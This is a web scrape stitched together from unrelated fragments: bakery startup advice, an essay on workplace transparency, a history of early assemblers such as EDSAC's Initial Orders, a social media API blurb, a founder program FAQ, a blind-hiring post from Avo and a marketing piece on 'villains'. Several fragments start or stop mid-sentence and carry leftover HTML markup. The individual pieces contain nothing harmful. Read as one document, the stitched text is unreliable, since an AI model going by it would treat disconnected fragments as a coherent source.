Then you define the range of products you are offering.&nbsp;</p><p>As a bakery, you can offer a large range of products. But, it’s interesting to narrow down and specialize your bakery on a few key bakes.</p><h3><strong>Market Need</strong></h3><p>Always be aware of what the market’s needs are, especially since they can often change. You can open an online bakery but get no results unless you investigate what the market is going for.&nbsp;</p><p>Explore your region to make sure you are not just offering more of the same. Observe if there is any demand for some specific product. Decide what you can offer and how you can do it. You can start your production offering what your region needs more. Sometimes that can be birthday cakes, but it can also be simple daily bread.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287f3d6a4df90473d1ad1b_hands-731265_1920.jpg" alt="hands baking"></p></figure><h3><strong>Solution Proposition</strong></h3><p>Now that you investigated what the market’s needs are, it’s time to give a solution. You already know what your region is demanding. Now, give the solution by offering a demanding product. And, of course, something more. You can, as an example, offer personalized cupcakes, vegan options, gluten-free, and so on.</p><h3><strong>Sales System</strong></h3><p>How are you going to sell your products? How are you going to deliver the sold goods? These are questions you must think when building the business plan. After all, you are selling delicate products, and on an internet base. You must have the plan very well-built, predicting any possible trouble you may have. You must decide how is going to be the payment method and if you are going to use an <a href="https://www.mightyforms.com/blog/how-to-create-an-order-form">order form.</a> Are you using Instagram for your sales? A website? Or both? Study your target market and see which way is better for selling.</p><h3><strong>Costs and Expenses</strong></h3><p>In your business plan, you must add any prediction of what you are going to spend during the process. These predictions must include:</p><ul role="list"><li>Kitchen renovation;</li><li>Equipment;</li><li>Supplies;</li><li>Ingredients;</li><li>License fees;</li><li>Insurance.</li></ul><h2><strong>2. Start Focusing On Marketing&nbsp;</strong></h2><p>You want your business to be successful. For this, you must be known, recognized, and seen. Your marketing strategy must focus on target customers. When you have an ideal client and focus any effort on delight them your chance of success is greater. But, what kind of strategy can you use for your online bakery? Here are three examples of how you can do your marketing strategy.<br></p><h3><strong>Create a Website</strong></h3><p>A website is the easiest way to divulge your bakery. Besides, this can be how you sell your products, as well. You are going to display your products on several landing pages. Write some content to go with the product description. You can also add order forms, intake forms, and contact forms to assist your prospect make an order or get in touch with you. Make your business easy to be found online.</p><h3><strong>Use Social Media&nbsp;</strong></h3><p>In a pandemic world where everyone is communicating remotely, it is easy to understand the importance that social media has gained. The past months changed the world and put a new perspective on how business must work. And an online bakery is exactly what people need right now. Use all the tools you have to sell your products.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287f7a068aa869efa6c5b6_social-media-1795578_1920.jpg" alt="Social media icons - MightyForms"></p></figure><p>Use social media that focuses more on the visual, like<strong> Pinterest and Instagram,</strong> to show your beautiful merchandise and sell it as well. Instagram is the main social media for food products. Use it without fear. Don’t forget any other social media that exists so you can profit and thrive. Don’t be shine. Use social media in favor of your online bakery.&nbsp;</p><h3><strong>Encourage Word of mouth</strong></h3><p>Word of mouth is still one of the most useful mechanisms of marketing. People that know your work and enjoy it can refer to friends and family. And you can also do it yourself by talking about your online bakery for everyone in your community. Besides asking for friends and family for assistance.&nbsp;Share campaigns and giveaways are two examples on how you can start word of mouth marketing.</p><p>‍<br></p><blockquote><strong>Fast fact: Messenger Apps As Your New Tool For Getting Close To The Customer: </strong>The modern world brings several tools and technologies to help the entrepreneur’s life. Online messengers, such as WhatsApp, Telegram, and Facebook Messenger, are tools that allow you to contact your prospects easily. And make your business open to new customers. For some places, it can help your business create a better set of contact with customers, which means more trust in your business. You can use online messengers to promote your bakery for everyone you have on your contact list and ask for them to do the same. Be aware of which of the messengers works better in your region.</blockquote><h2><strong>3. Define Your Online Bakery Specialty</strong></h2><p>The world is going into specialized markets. So should your online bakery. Your specialty can be personalized frosting, or maybe your products are all vegan or gluten-free. Or you can create your own recipes. Or you can offer products inspired by recipes from other countries. No matter how you do it, as long as you do it.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287d75063b890c9bae4dab_stephanie-leblanc-NZH0p2_2kMo-unsplash.jpg" alt="Specialized bakery"></p></figure><h3><strong>Why have a specialty?</strong></h3><p>When you have a specialty,&nbsp; it makes it easier to stand out from your competitors. Focusing on a few types of products, you can get more specific feedback to improve your product, define your business, and become a reference for that specialty.</p><p>Starting as an original niche is going to highlight your business against your backdrop of competitors. That can be the winning card for your bakery. It doesn’t mean that you can’t have various products, it only means that you have one type that is your masterpiece.</p><h2><strong>4. Prepare The Offline Background&nbsp;</strong></h2><p>When you’re starting any business you need to know in advance the cost of every tool and resource you need to get the gears running. In the case of an online bakery, you need not only an online marketing strategy, but you also need to consider the offline background of workspace, tools, and supplies.&nbsp;</p><p><strong>Investigate all the costs of starting your home bakery and the ongoing expenses</strong>. You must have projections of any costs you will have during the production and distribution. And calculate into your business pricing.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287fb0b52c819bc38ec2cf_taylor-grote-LqkFX2Km1a0-unsplash.jpg" alt="Cupcakes in oven "></p></figure><p>‍</p><p>Other aspects to consider are:</p><ul role="list"><li><strong>Space. </strong>Any production requires a certain space. Be sure you have the proper place to start your production. It must be clean, sanitized, large enough so you can prepare your tasty treats. Watch over your local regulation as well. See if you can use your home kitchen, or if you need a separate space to start baking.</li><li><strong>Equipment. </strong>If you are going to bake cakes you must have the proper equipment, that is different for cookies, cupcakes, bread, etc. For each kind of specialty, you must be prepared with the proper kind of equipment. Be sure you have the right oven, fridge, and kitchen utensils.</li><li><strong>Employees. </strong>Think about it: <em>Does your business need anyone else to help?</em> Maybe you need someone to make the deliveries or to assist you in baking. No matter the reason, you must be prepared to hire someone if it is the case. Study your business and try to see if or when you are going to start hiring. Again, pay close attention to your state and county laws.</li><li><strong>Supply. </strong>You can’t prepare food without the right ingredients. Put in your account all the supplies you may need to use when cooking. Don’t ever let any of your main ingredients lack in your kitchen. You must have in hand everything you need before starting baking. Organize your space and pantry.</li></ul><h2><strong>5. Register your business</strong></h2><p>At last, but not least, comes the registration of your new business, or the transferred one. It must be registered according to any legal aspect that exists for home bakery and cottage food, both at state and local levels.&nbsp;</p><p><strong>State laws </strong>must be observed. As an example, we have Indiana, where you can’t produce cottage food in your residence and Ohio, where to be considered cottage food it must be made in a residence kitchen. Therefore, look with close attention to understand your own state and local legalization. You can always consult the <a href="https://www.chlpi.org/flpc-releases-cottage-food-laws-united-states-report/">Harvard Law School: Food Law and Policy Clinic (FLPC) report</a>. In this report, they clarify what each state determines for cottage food and home bakery.</p><p>Besides looking for any regulation, you must guarantee that you have licenses, certifications, and health requirements. All to be sure that your business can function properly and legally. For State information about <a href="https://www.mightyforms.com/blog/small-business-forms">how to open a small business</a>, you can consult <a href="https://www.sba.gov/blogs/">the U.S. Small Business Administration.</a></p><h3><strong>Changes in the kitchen or baking space</strong></h3><p>Depending on the state laws for home bakery and cottage food you may need to change aspects from your residence. Some changes are necessary and can guarantee the safety of not only your business but also your family.</p><p>We are talking about installing sprinkler systems and …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>It is wise to assume <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">good
intent</a> of your colleagues. It
is also wise to assume your colleagues may not all do the same for you. Being
transparent can help remove any doubt that you are acting in good faith.</p>
<p>Transparency can be scary. It sometimes means weighing in sooner than you
might otherwise be comfortable, with less information, and with unpolished
thoughts. It often means taking a position and having to revise it later. But
occasionally being wrong in front of others and owning up to it is precisely
what allows us to be trusted as
<a href="https://boz.com/articles/authenticity">authentic</a>.</p>
<p>Transparency is not a mythical state of being. It is a set of simple
practices:</p>
<ul>
<li>Be responsive. At Facebook, in particular, being unresponsive is seen as
very disrespectful. That doesn’t mean people get to hijack your schedule with
any email they send. It means they will get a timely response that sets their
expectations for when they can expect a full response. As a transparency bonus
you may even find it helpful to share what work you are prioritizing instead.</li>
<li>Be open. If you have concerns but wait until a conversation is almost closed
to raise them it can surprise people and invite them to wonder if you have
ulterior motives for derailing the progress of the group. Instead be open
about what you are thinking even if it isn’t fully thought through yet. Just
make sure you preface it with the fact that you are still thinking things
through and may change. That allows others to understand and participate not
only around the concern but also your mental processes.</li>
<li>Be proactive. When you arrive at a position that impacts others they should
ideally hear about it from you. I always tell people if I have feedback for
them they will hear it from me first. Those who have worked with me for a
while can likely vouch that I am as good as my word. That allows people to
feel confident that if they haven’t heard from me then there is nothing new
they need to know. No news really is good news.</li>
<li>Be consistent. Few things create conspiracies faster than a message that is
adapted for different audiences. When people invariably exchange notes and
discover they were told different things their minds immediately jump to
malice.</li>
<li>Communicate at scale. Writing or speaking to larger groups is greater
transparency not only because it extends to more people but because those
people now all have <a href="https://boz.com/articles/mutual-knowledge">mutual
knowledge</a> of your mindset.</li>
</ul>
<p>When it comes to maintaining trust many people work hard to avoid mistakes.
But mistakes do far less damage to trust than secrecy does.</p></section></div></div>]]>

<p><strong><em>(a short history of the birth of assembly)</em></strong></p>

<p>The use of assembly language and an assembler was an idea that evolved at the dawn of early digital <em>stored program computers</em>, in the decade following the Second World War. <a href="https://en.wikipedia.org/wiki/Richard_Hamming">Richard Hamming</a> reports an estimate that the use of assembly language represented a 2x improvement on programmer productivity <a href="#hamming">[p. 31]</a>.</p>

<p>Nonetheless, it took awhile to catch on amongst experienced programmers, many of whom continued to program in the earlier <em>machine code</em>.  Hamming reports of these programmers dismissing assembly as ‘sissy stuff’ and there are legends of towering figures in computing being quite dismissive of it. This piece is a short historical survey of the early development behind initial assembly languages and samples some of these early reactions to it.</p>

<h2 id="programming-before-assembly">Programming Before Assembly</h2>

<p>At the dawn of assembly, the model of computing which was taking shape was that of the <em>stored program computer</em>. The ideas for the <em>stored program computer</em> sprang out of the <a href="https://en.wikipedia.org/wiki/ENIAC">ENIAC Project</a> and its shortcomings.  One of the early shortcomings of the ENIAC was that it required significant hardware modifications each time a new program was run <a href="#campbell">[p.75]</a>.  <a href="https://en.wikipedia.org/wiki/John_von_Neumann">John von Neumann</a> did consulting work on this project and outlined the ideas for improvement from this collaboration with the ENIAC team in the <a href="http://web.eah-jena.de/~kleine/history/machines/VonNeumann-1stDraftReportEDVAC.pdf">initial report on the EDVAC</a>, though there are questions about who should get credit for the ideas <a href="#hamming">[p. 24]</a><a href="#campbell">[p. 77]</a>.</p>

<p>One of the most important of these ideas was to organize the computer such that the program being executed is itself also stored in the computer’s memory–this way, the computer itself did not need to be tediously reconfigured for each new program <a href="#campbell">[p. 75-76]</a>.</p>

<h2 id="what-is-assembly">What is Assembly?</h2>

<p>Stored program computers understand and can execute <em>machine code</em>, code expressed in numerical form (many of the earliest computers in pure binary). Below is a very short snippet of a more modern version of such machine code:</p>

<p><code>6689C3</code></p>

<p>From a human’s perspective, it’s not very intuitive, and if you are not incredibly immersed in a specific set of machine code, it is  <em>meaningless</em>.</p>

<p>In contrast, the below code is something a human with knowledge of English can get some type of idea about, even with little background.</p>

<p><code>mov bx, ax</code></p>

<p>The second snippet is assembly code, which is read by an <em>assembler</em> and translated into the first snippet for execution by a computer.</p>

<p>In <em>Assemblers and Loaders</em>, an assembler is described as <a href="#saloman">[p. 1]</a>:</p>

<blockquote>
<p>… a translator that translates source instructions (in symbolic language) into target instructions (in machine language), on a one to one basis.</p>
</blockquote>

<p>For early <em>stored program computers</em>, humans had to <em>first do this translation</em> themselves <em>before</em> they could execute the programs. The idea behind assembly was to <em>use the machine itself</em> to translate between a more programmer friendly notation and the code the machine could understand, because computers are great at manipulating symbols at a high speed and precision <a href="#campbell">[p. 168]</a>. <a href="https://en.wikipedia.org/wiki/Richard_Hamming">Richard Hamming</a> reports an estimate that the use of assembly language represented a 2x improvement on programmer productivity <a href="#hamming">[p. 31]</a>.</p>

<h2 id="the-development-of-assembly-on-early-stored-program-computers">The Development of Assembly on Early Stored Program Computers</h2>

<p>Inspired by von Neumann and the ideas in the EDVAC report, two British research camps started working on stored program computers at the end of the 1940s, leading to some of the earliest assemblers.</p>

<p><a href="https://en.wikipedia.org/wiki/Andrew_Donald_Booth">Andrew Booth</a> led the ARC project out of Birbeck College, with <a href="https://en.wikipedia.org/wiki/Kathleen_Booth">Kathleen Booth</a> (born as Britten) as an assistant — Kathleen is credited with creating an assembler for the ‘ARC2’. Meanwhile, <a href="https://en.wikipedia.org/wiki/Maurice_Wilkes">Maurice Wilkes</a> led the EDSAC project out of Cambridge with David Wheeler as an assistant — Wheeler is credited with creating the EDSAC’s assembler <a href="#campbell">[p. 81]</a>.</p>

<p>The tedium of translating human symbolic understandings of programs into machine-readable programs led to the early assemblers.</p>

<h3 id="the-arc-project-kathleen-booth">The ARC Project &amp; Kathleen Booth</h3>

<p>Kathleen was working with Andrew on the ARC, a specialized computer for calculating Fourier synteses 12-24x faster than a research student could do using traditional methods <a href="https://www.ams.org/journals/mcom/1954-08-046/S0025-5718-54-99336-9/S0025-5718-54-99336-9.pdf">[p. 102]</a>. After visiting von Neumann in Princeton, they constructed the ARC2, which was a <a href="https://www.i-programmer.info/history/people/1253-andrew-booth.html">‘stored program computer’</a>.</p>

<p>She and her husband released a few publications about this machine in 1947, one of which is <a href="http://www.mt-archive.info/Booth-1947.pdf"><em>General Considerations in the Design of an All Purpose Electronic Digital Computer</em></a>. The second, <em>Coding For A.R.C</em>, is believed to contain her <a href="https://hackaday.com/2018/08/21/kathleen-booth-assembling-early-computers-while-inventing-assembly/">assembly language for the ARC2</a>. There is little documented about this second report and, as far as we know, there is no digital copy of <em>Coding For A.R.C.</em>. Birbeck College only goes as far as to say she <a href="https://www.dcs.bbk.ac.uk/about/history/">‘developed a very early assembly language’</a>.</p>

<h3 id="edsac-david-wheeler">EDSAC &amp; David Wheeler</h3>

<p>The story of David Wheeler and the EDSAC is more widely documented.</p>

<p>As it goes, Maurice Wilkes led the EDSAC project (after visiting the United States and learning about the EDVAC) to launch a stored program computer at Cambridge University. The EDSAC became operational in May 1949 <a href="#campbell">[85]</a>. During this project Wilkes noticed that ‘assembling’ <em>is something computers are well equipped to do;</em> he put David Wheeler on this job for a doctorate project <a href="#campbell">[168-169]</a>.</p>

<p>The result of this project was the <em>Initial Orders</em> program, completed in May 1949, which would translate more human friendly punched codes into binary, and was loaded into memory as a <a href="https://www.cl.cam.ac.uk/~mr10/Edsac/edsacposter.pdf">‘bootstrap program’</a>.</p>

<p>Wikipedia cites the earlier source crediting Kathleen Booth as the inventor of assembly. Her <em>Coding for A.R.C.</em> piece was released in 1947, while Wheeler’s Initial orders came online later in 1949. He is credited by the IEEE Computer Society as having created the first <a href="https://www.computer.org/profiles/david-wheeler">‘assembly language’</a>. As far as we are aware, there is no digital copy of <em>Coding for A.R.C.</em>, and it is something we would love to see come online.</p>

<h3 id="ibms-early-commercial-assemblers">IBMs Early Commercial Assemblers</h3>

<p>In the early 1950s, IBM’s first commercial computers also had assemblers running. These assemblers took another step forwards from the early academics who developed assemblers. The earlier assemblers used more human friendly symbols for ‘operations’, but computer addresses were still fixed in a program’s code. This had the downside that programmers who encountered and corrected bugs needed to re-assign a chain of subsequent addresses by hand or use an alternate method and end up with ‘spaghetti code’ <a href="#hamming">[p. 25]</a>.</p>

<p>With IBM’s assemblers, <em>symbolic</em> addresses were introduced, where the assembler did the work of address assignment for the programmer <a href="https://blog.deta.sh/posts/assembly/(https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=4640454)">[p. 116]</a>. Both IBM’s first commercial scientific (<a href="https://en.wikipedia.org/wiki/IBM_701">the 701</a>) and business (<a href="https://en.wikipedia.org/wiki/IBM_650">the 650</a>) computers had assembly languages with symbolic addresses. For the 701, Nathaniel Rochester developed the <a href="https://ia600101.us.archive.org/25/items/symbolic-programming/Image111817152723.facing_text.pdf">*Symbolic Assembly Program (SAP) in 1953</a>. For the 650, Stan Poley <a href="http://www.columbia.edu/cu/computinghistory/650.html">developed SOAP in 1955</a>, which improved the performance of programs by the intelligent assignment of addresses <a href="#saloman">[p. 16]</a>.</p>

<h2 id="early-responses-to-assembly">Early Responses to Assembly</h2>

<p>Though most of the following perspectives are largely anecdotal, they suggest there is evidence that using <em>assembly language</em>, or anything higher than machine code, took time to catch on among practicing programmers and faced tremendous skepticism, even from earlier figures of our story, like Von Neumann (credit to <a href="http://worrydream.com/dbx/">this presentation</a> for the sources).</p>

<p><a href="http://ei.cs.vt.edu/~history/VonNeumann.html">John Lee</a> reports anecdotes from von Neumann himself questioning the use of anything higher than machine code :</p>

<blockquote>
<p>In the 1950’s von Neumann … was confronted with the FORTRAN concept; John Backus remembered von Neumann being unimpressed and that he asked “why would you want more than machine language?” …</p>

<p>… Donald Gillies, one of von Neumann’s students at Princeton, and later a faculty member at the University of Illinois, recalled in the mid-1970’s that the graduates students were being “used” to hand assemble programs into binary for their early machine (probably the IAS machine). He took time out to build an assembler, but when von Neumann found out about he was very angry, saying (paraphrased), “It is a waste of a valuable scientific computing instrument to use it to do clerical work.”</p>
</blockquote>

<p>Richard Hamming, writing about programming on the IBM 701 (the same machine Rochester developed the assembler for) <a href="#hamming">[p. 25]</a>:</p>

<blockquote>
<p>I once spent a full year, with the help of a lady programmer from Bell Telephone Libraries, on one big problem coding in absolute binary for the IBM 701, which used all the 32K registers then available. After that experience I vowed never again would I ask anyone to do such labor. Having heard about a symbolic system from Poughkeepsie, IBM, I ask[ed] her to send for it and to use it on the next problem…As I expected, she reported it was much easier…</p>

<p>So we told everyone about the new method, meaning about 100 people …</p>

<p>… To my knowledge only one person —yes, only one—of all 100 showed any interest!</p>
</blockquote>

<p>He also writes (most probably about <a href="#ibms-early-commercial-assemblers">Rochester’s system for the 701</a>) <a href="#hamming">[p. 26]</a>:</p>

<blockquote>
<p>Finally a more complete, and more useful, Symbolic Assembly Program (SAP) was devised after more years than you are apt to believe … most programmers continued their heroic absolute binary programming. At the time SAP first appeared I would guess about 1% of the older programmers were interested in it—using SAP was “sissy stuff” and a real programmer would not stoop to wasting machine capacity to do the assembly.</p>
</blockquote>

<p>As Rochester developed SAP out of Poughkeepsie for IBM, it raises the question if Hamming’s two anecdotes were referring to one and the same event, and the earlier ‘symbolic system’ was also Rochester’s assembler.</p>

<p>Nonetheless, Hamming estimates an initial interest level of about 1% amongst experienced programmers, despite his report of an estimated 2x productivity improvement.</p>

<h2 id="conclusion">Conclusion</h2>

<p>The anecdotal evidence suggests assembly language was far from an overnight success, despite the advantages it offered. Nonetheless zooming forwards, it’s clear that the idea behind assembly took hold. At a more abstract level, the idea of ‘<em>buffering the user from the machine itself</em>’, most likely using the computers themselves to do so, has …</p></article></div>

<p>When you manage your social media presence there are two distinct types of posts: manual and automated. </p>



<p>Manual posting and scheduling is when you type up a post and choose a time for it to be published, usually via a <a href="https://www.techradar.com/best/best-social-media-management-tools">scheduling tool</a> (there are some great ones out there). </p>



<p>Automated posting and scheduling is when system generated data automatically posts to your social media networks via your back-end system using an API. </p>



<p>For example, a game company might auto-post when a gamer enters the top-ten leaderboard. Or a news company’ back-end system sees a new breaking headline and automatically schedules the post without manual intervention. If your system has unique dynamic data you should consider publishing to your networks.</p>







<p>Ideally, all scheduling tools would provide an API to programmatically schedule post, but unfortunately most don’t or have <a href="https://buffer.com/developers/api">removed</a> their API access.</p>



<p>When building <a href="https://www.ayrshare.com/">Ayrshare</a> as an API-first social media posting and scheduling tool, we did a lot of research on the APIs available in the market. We would like to share what we have found. </p>

                Our founders, Baris and Armaan, met on the first day of
                international student orientation at Stanford. That year, Baris
                started a web development automation business, while Armaan
                began investing in companies started by his entrepreneurial
                peers.
              </p>
              
              <p>
                Both realized they loved helping students with a cerebral desire
                to have a meaningful, material impact. Sometimes that meant
                guiding them to jobs at high growth startups. Sometimes it meant
                helping them build their own startups (and investing in them).
                Sometimes it was a combination of both.
              </p>
              
              <p>
                The desire to help students make a meaningful impact led to the
                founding of Human Capital. Over the last 5 years, we’ve built
                relationships with more than 5,000 engineers and entrepreneurs
                and spent countless hours helping young founders dissect
                industries, test early betas, and acquire their first customers.
              </p>
              
              <p>
                We’ve invested in six companies that are now worth over $1B
                each, and have over $200M in AUM. And we’re eager to partner
                with more great young founders.

              <p>
                Incoming, current, and recent undergraduate and graduate
                students.

                Do I need to take a semester off from school?
              </h4>
              <p>
                No, but we recommend it. We expect you to dedicate a significant
                amount of time to the program, but it’s up to you.
              </p>

                Do I have to drop out of college after the program?
              </h4>
              <p>
                No. You should do what you think is best—whether that means
                going back to college, pursuing your startup idea, or something
                else entirely.
              </p>

                Are you looking for solo founders or co-founder pairs?
              </h4>
              <p>
                Either. You can apply as a solo founder, but we’ve found most
                successful ventures are built by teams—so if you know someone
                exceptional you’d like to build with, mention them in the
                application and encourage them to apply.

                August through December.

              <p>
                Yes. We hope you’ll apply, no matter what country you live in.
                If you’re selected, you can work from wherever you want. If you
                have a visa, we’ll work with you to find the best way to have
                you participate. (There are tax implications for international
                students that you’ll need to handle since each country has its
                own specific tax policies and regulations, but we’ll work
                through any issues with you together.)

August 25, 2020 | https://www.avo.app/blog/how-we-hire-at-avo | <a href="https://web.archive.org/web/*/https://www.avo.app/blog/how-we-hire-at-avo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Every application is reviewed blind to ensure fairness.</p><p>Avo is committed to hiring talent of diverse backgrounds because not only does <a href="https://www.weforum.org/agenda/2019/04/business-case-for-diversity-in-the-workplace/">the data now demonstrate the business validity</a> of having an inclusive workplace, but because it’s the right thing to do.&nbsp;</p><h3>With Systematic Structures Against Bias</h3><p>It is one of my deep passions to combat the unconscious bias that most of us have (I recommend taking the <a href="https://implicit.harvard.edu/implicit/takeatest.html">Harvard managed test for unconscious bias</a>). Unfortunately, as Iris Bohnet discusses in In <a href="https://www.goodreads.com/book/show/27311743-what-works#:~:text=Gender%20equality%20is%20a%20moral%20and%20a%20business%20imperative.&amp;text=Presenting%20research%2Dbased%20solutions%2C%20Iris,and%20the%20lives%20of%20millions.">What Works: Gender Equality by Design</a>, it’s difficult to rewire our brains. She even refers to research showing how we subject ourselves to our pendulum swinging backwards whenever we try to educate ourselves (much like we think we deserve a break from being unbiased after the hard work of learning how not to be biased). Instead, the most efficient tool to combat bias is to structure hiring and compensation processes so we remove any opportunity to act on bias.&nbsp;</p><p>When we looked into how we could make this a reality for hiring at Avo, we found <a href="https://www.beapplied.com/">Applied</a>. It’s a&nbsp; platform designed following best practices to prevent the opportunity for unconscious bias. Instead of focusing on the person’s background, the Applied process asks the candidate to reflect on situations related to the role, and enables a structured, unbiased review of the person’s potential and ability.</p><h3>How We Use Applied At Avo</h3><p>These questions outline situations that may come up – directly or indirectly related to the role. Some of the situations are complicated, and this is a great opportunity to shed a light on how aligned Avo and the candidate are in how to handle them. The answers are then anonymized and randomized for a blind review.. It means that each answer is reviewed individually, without us knowing anything about the candidate, or their other answers.&nbsp;&nbsp;</p><p>When hiring for <em>Growth Marketing</em> we asked what recent campaign for a technical product stood out to them. When hiring for <em>Product Designer</em> we ask how to respond to a customer feature request or inconsiderate feedback from someone in a leadership position. When hiring for <em>Infrastructure Developer</em> we ask how they’d address a design issue in the core data model.&nbsp;&nbsp;</p><p>It’s our job as founders to find highly skilled individuals for each and every role. It’s hard to adequately account for one’s own biases, even when acknowledged and worked against. And as a data scientist, I believe in a systematic solution. That’s why Avo chose Applied’s blind process as a way to ensure fairness throughout the process, which is really important to me, personally.&nbsp;</p><p>Working against bias is more than addressing the obvious gender and race discrimination we face in the tech industry. It’s also a matter of making sure our culture is accessible to anyone who does good work, and good work will be celebrated no matter who does it. There are also those who feel like they might not fit a stereo-type of the industry, or those who live far away from tech-centric cities. And even still, some feel like they may have never been given the opportunity to demonstrate their skills.&nbsp;</p><p>We find that with this process, we’re able to really get a sense of the person’s fit for the role; removing any bias we might have had, consciously or subconsciously, on the person’s age, gender, sexuality, race, nationality, location, or background.&nbsp;</p><p><strong>What ultimately matters is we’re able to hire the right people, fast, and that the people we want to work with are willing to go through this process with us.&nbsp;</strong></p><h3>What do the applicants think?&nbsp;</h3><p>The feedback we’ve received so far has been outstanding. 9 out of 10 would recommend this process – and that includes a lot of people we could not hire. To exemplify, here are a few anonymous quotes from people who have gone through this process:</p><p>"I wish more companies assessed their candidates this way. I hope this eliminates bias."<br></p><p>“Just applied, I LOVED that application process"</p><p>"That fact y'all are actually testing their knowledge is amazing and not just judging a book by the cover, or <em>well</em> – <em>person</em> by a piece of paper (resume!). I like the alternative approach of blind question-answer review and screening for hiring bias!"<br></p><p>"I totally enjoyed this application process compared to other application formats. I'm reflecting and thinking based on the given scenarios. I have learned a lot and I love it."</p><p>We find this dive into our candidates’ problem-solving skills, which ultimately is what we’re hiring them for, has been a huge success. Aligning on ability seems fairer than judging someone based on what they look like or the logos on their CVs. And we found that the people we’ve met in our hiring process love that we let their work stand for itself; regardless of their background, where they’re from, or what they’ve done in the past.&nbsp;</p><div><p>My personal goal for 2020 was to maintain a gender balance in Avo through our 2020 hiring. Now we’ve succeeded in making sure more than 50% of our team is female identifying. This is a rare feat, which I’m proud of. I also understand that this means it’s time to set more aggressive goals. It is imperative to my co-founder, Solvi, and myself, to continue to build inclusive culture at Avo. </p><p>– Stefania Olafsdottir<br>Avo CEO and co-founder</p></div><p><strong>What are you waiting for, we are hiring for two roles!&nbsp;</strong></p><p><a href="https://www.avo.app/jobs"><strong>Now is the time to apply. We want you to join us &gt;&gt;&nbsp;</strong></a></p></div></div>]]>

<h2>Villains Make Heroes Look Better</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>HubSpot, Basecamp, and Box understand a core tenet of storytelling: villains exist to make heroes look better.</p><p>Without a force to fear, fight, and eventually overcome, your story isn’t worth telling. Remove Sauron from <em>The Lord of the Rings </em>and you have a flaccid tale of Frodo’s privilege and family squabbles. Without the nemesis of “outbound marketing,” the redemption offered by inbound marketing is meaningless.</p><p>There’s a lot going for the hero vs. nemesis dynamic:</p></div>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><strong>Build empathy.</strong> A day in the life of your target customer is fraught with frustration, like—in the case of HubSpot’s target audience—an inbox of junk mail, obnoxious telesales callers and internet-ruining pop-up ads. Vilification allows you to call out the struggle, empathize with the reader, and nudge your product into view:<em> “You’re sick of this. So are we. Here’s the product we built to fix it.”</em></li><li><strong>Differentiate. </strong>Most marketing is pretty saccharine. Measured criticism and, heaven forbid, acknowledging the existence of your competitors, can cut through the mix like nothing else. Picking a fight—albeit in a measured, strategic way—is just downright interesting.</li><li><strong>Change your industry.</strong> DHH’s critique of Apple gained traction because of its valid concern: monopoly power. Many of the story’s loudest amplifiers were other company founders who had fallen afoul of seemingly arbitrary judgments from Apple. Criticizing Apple led to Hey’s approval and, according to DHH, it “<a href="https://twitter.com/dhh/status/1276158293375934470?s=20">paves an illuminated path</a>” for other apps to follow.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>HubSpot, Basecamp, and Box illustrate three different approaches to “beef marketing,” and three different ways you can cast a villain in your own story. They are (in order of ascending spiciness):</p>

<h2>You vs. the Legacy Solution</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>HubSpot’s vocal opposition to “outbound marketing” is an example of squaring off with a legacy solution—an older, dated, and relatively inefficient way of achieving the same goals as your product.</p><p>Spreadsheets are the classic legacy solution.<a href="https://twitter.com/thinking_slow/status/1255874409086287879?s=20"> As this viral tweet posits</a>, the chances are high that someone, somewhere, is using the humble spreadsheet to achieve pretty much the same thing your product does. In the same way, outbound marketing is just an amalgamation of lots of legacy marketing tactics—like cold calling and direct mail.</p></div>
<!-- /wp:paragraph -->

<!-- wp:html -->
<blockquote><p lang="en" dir="ltr">*spreadsheets* are the main competitor for 90% of software startups</p>— Ryan Law (@thinking_slow) <a href="https://twitter.com/thinking_slow/status/1255874409086287879?ref_src=twsrc%5Etfw">April 30, 2020</a></blockquote> 
<!-- /wp:html -->

<!-- wp:paragraph -->
<div><p>Legacy solutions are soft targets for vilification because they’re often processes or products so old as to be virtually faceless. You can criticize spreadsheets freely: they’re slow, prone to human error, and difficult to scale, and Excel’s board members won’t take offense at the critique. Similarly, outbound marketing is a total straw man: it isn’t a person, or a company, or really even a single process, so there’s nobody to resist the critique.</p><p>As a result, any company can cast a legacy solution as the villain of their story. Many do:</p></div>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Coda’s entire go-to-market messaging is built around its opposition to spreadsheets, epitomized by the tagline <em>“</em><a href="https://coda.io/welcome" target="_blank" rel="noreferrer noopener"><em>Enough of this sheet</em></a>.<em>”</em></li><li>Vyond’s animation software <a href="https://www.vyond.com/resources/the-6-best-business-presentation-software-alternatives-to-powerpoint/" target="_blank" rel="noreferrer noopener">takes aim at PowerPoint</a>, another last-generation product in the same vein as Excel.</li><li>Greenlight Guru pits itself against old-fashioned processes and “<a href="https://www.greenlight.guru/blog/legacy-quality-management-systems" target="_blank" rel="noreferrer noopener"><em>the lure of legacy quality management systems</em></a>,<em>”</em> highlighting the pitfalls of using paper or <em>“digital paper”</em> solutions like Google Docs.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>These legacy solutions are easy enough to find. They’re the products and processes your product is bought to replace, discussed in every sales call and likely still used by laggardly hold-outs. If in doubt—trash-talk the spreadsheet.</p>

<h2><strong>You vs. the Big Guy/Gal</strong></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
